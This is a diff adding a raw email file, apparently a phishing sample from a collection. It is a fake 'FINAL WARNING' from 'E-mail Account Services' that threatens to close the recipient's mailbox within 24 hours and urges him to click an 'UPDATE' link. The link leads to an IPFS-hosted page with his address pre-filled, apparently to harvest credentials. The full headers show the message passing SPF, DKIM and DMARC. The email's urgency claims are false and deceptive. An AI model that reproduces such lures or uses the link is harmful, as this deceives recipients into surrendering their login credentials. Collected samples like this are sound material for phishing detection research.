@@ -1,0 +1,107 @@
+From jose@monkey.org Tue Nov 28 02:12:38 2023 +0000
+Return-Path: sales@biz-feature.com
+Delivered-To: jose@monkey.org
+X-FDA: 81505739196.05.C7EAADA
+Received: from biz-feature.com (biz-feature.com [106.75.28.104])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id D4891160003
+	for <jose@monkey.org>; Tue, 28 Nov 2023 02:12:35 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=pass header.d=biz-feature.com header.s=default header.b=VSsQPfn5;
+	spf=pass (imf04.b.hostedemail.com: domain of sales@biz-feature.com designates 106.75.28.104 as permitted sender) smtp.mailfrom=sales@biz-feature.com;
+	dmarc=pass (policy=quarantine) header.from=biz-feature.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1701137556;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=zmIHsFjFzNgRZ4yZEKES6XIqFpqxjal4PtpqmLU/l00=;
+	b=KJgr/yCI5UYb/48hel6iHnXrSq8ziBtUCQ1kYvG0A8xQsUgtESE6hfMiThkvHbiqnIC5lb
+	GihPq6TVNGWhPaj355owCMTcqyvfGyJBYd802l1ZfzsfCAo8aSUqCCpVyIalqt49oKMBAY
+	c2kZJcW8E04e0AH4l9rigdX/8VUcnow=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=pass header.d=biz-feature.com header.s=default header.b=VSsQPfn5;
+	spf=pass (imf04.b.hostedemail.com: domain of sales@biz-feature.com designates 106.75.28.104 as permitted sender) smtp.mailfrom=sales@biz-feature.com;
+	dmarc=pass (policy=quarantine) header.from=biz-feature.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1701137556; a=rsa-sha256;
+	cv=none;
+	b=0T2TgLJ9d3aTC8Ehz7yuLPdnC7MdBAuTx0Gm5Gepg5bIN8sx4uehNvI9AMnDsGEcFPSrj7
+	CLM34xTwPNHWGmPVxJkpnLyjCWSEnIBndrM4ALI4pc7rQCdeO/v30a7E+19JI+W2GDY6Kz
+	Vw6uQU6hB0R1S2LZgeZlofuPn/3kUjk=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=biz-feature.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=sales@biz-feature.com;
+ bh=o+sk2meIHZSW19gp73ylNkm3ARQ=;
+ b=VSsQPfn5vzeID100+RfO43ncjly/rjSh8Q4n1VVqPHuwq6UN6W3UIcFoiKgXV+p7J0KN0Xm2BOlR
+   WljBQ/Ycw1BnGxYB9uFS5a2PmJwrue+9ftgcZq9E2XYHhcGBcsHO6N0z1sF96dJ+U+DLG+Voa2AB
+   wBfxDkQUD6tpA4SLQ78=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=biz-feature.com;
+ b=rJmHzE02V5ejqAFYRT29GQ/h2/fm0wJ+d59WqEa5OP86PCP2ixVlWRx23q9O0VlrW4jWq7jzQMwn
+   5VkOVprsRYJwtVJ5xnvg6tUYAbVfcYdfritBsC+x8noLgJnZtREeQR/diT5Vjofw9rDNyVt6it4N
+   ETyZWQ9Lh8LGLHlXJR4=;
+From: Email Account Update<sales@biz-feature.com >
+To: jose@monkey.org
+Subject: FINAL WARNING : YOUR E-MAIL WILL CLOSE WITHIN 24 HOURS
+Date: 27 Nov 2023 18:12:31 -0800
+Message-ID: <20231127173327.828A4D0400CD4490@biz-feature.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: D4891160003
+X-Stat-Signature: hdk9716fr5xormceebysphm44wqp7wfd
+X-Rspam-User: 
+X-Spam-Status: No, score=3.20
+X-HE-Tag: 1701137555-20209
+X-HE-Meta: U2FsdGVkX19DHEVaIebsWjgxVC1QVG34GBcZO8ma4wyXNXYqZytF3nmlG0KRDYm/HsuwnZPq4URGTSllyuQUXp//JwCMPffc8O7jYPXt6PT5COQRPEOMc7BM6n1iV0yHkrtoc/P65gGIbvmDIutyhNfr0q3gl4TIt+DkNlWlDahrgkjYYS5Rjclh5XLRQrXPmh6acrM1tEz4nanQrbhbnvSCS72yWdceh0f0eYUi3p0=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 385
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003"></head>
+<body><p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Ar=
+ial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-colo=
+r: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-colo=
+r: initial; font-variant-ligatures: normal; font-variant-caps: normal; -web=
+kit-text-stroke-width: 0px;'>Dear jose</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+You would be blocked from sending and receiving emails if not confirmed wit=
+hin 24hrs of receiving this automated mail.</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+You are required to update through the link below.</p>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>
+<a title=3D"" style=3D"color: rgb(25, 106, 212);" href=3D"https://bafybeigt=
+mjhtvv2grty3hv524uayqoebye7tlr5wqheurfflp64o3aota4.ipfs.dweb.link/engaux1.h=
+tml?e=3Djose@monkey.org" rel=3D"nofollow noopener noreferrer">UPDATE</a></p=
+>
+<p style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Helvetica Neue", Helvetica, Arial, s=
+ans-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb=
+(255, 255, 255); text-decoration-style: initial; text-decoration-color: ini=
+tial; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px;'>Thanks,<br><br>
+E-mail Account Services</p></body></html>
